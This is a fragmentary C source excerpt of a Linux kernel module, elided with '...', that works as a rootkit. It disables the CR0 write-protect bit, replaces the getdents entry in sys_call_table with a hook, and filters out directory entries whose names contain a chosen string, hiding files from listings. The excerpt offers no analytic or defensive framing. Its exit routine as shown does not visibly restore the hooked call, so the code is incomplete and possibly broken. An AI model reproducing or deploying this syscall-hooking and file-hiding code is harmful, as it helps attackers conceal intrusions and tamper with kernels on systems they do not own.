	...
	if (tmp > 0) 
 	{
		...
		copy_from_user(dirp2,dirp,tmp);
  		...
  		while (t > 0) 
  		{
			n = dirp3->d_reclen;
		   	t -= n;
		   	if (strnstr((char *) &(dirp3->d_name), (char *) &hide,strlen(hide)) != NULL)
		   	{
		    		if (t != 0)
...
static int ls_init(void) {
	...
	//original_stat=(void*)(sys_call_table[__NR_stat]);
        write_cr0 (read_cr0 () & (~ 0x10000));
        sys_call_table[__NR_getdents]=(void *)&lsinfo;
	//sys_call_table[__NR_fstat]=(void *)&lsinfo2;
        write_cr0 (read_cr0 () | 0x10000);
...
static void ls_exit(void) {
	...
	//sys_call_table[__NR_fstat]=(void *)original_fstat;
	//sys_call_table[__NR_stat]=(void *)original_stat;
        write_cr0 (read_cr0 () | 0x10000);                             
        printk("MODULE EXIT\n");
	return;
}
